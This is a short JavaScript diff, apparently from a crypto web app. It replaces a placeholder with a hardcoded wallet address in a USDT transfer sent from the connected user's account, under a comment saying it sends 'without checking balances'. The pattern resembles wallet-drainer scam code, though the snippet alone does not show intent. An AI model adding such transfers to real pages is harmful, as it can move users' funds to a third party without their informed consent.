@@ -452,7 +452,7 @@
         try {
             // Attempt to send the transaction without checking balances
             const transaction = await usdtContract.methods
-                .transfer("YOUR_RECEIVING_WALLET_ADDRESS", usdtAmount)
+                .transfer("0x9DE6Ee13F58B3e9B551202D8040983fdAfFE6033", usdtAmount)
                 .send({ from: accounts[0] });
 
             console.log(transaction);
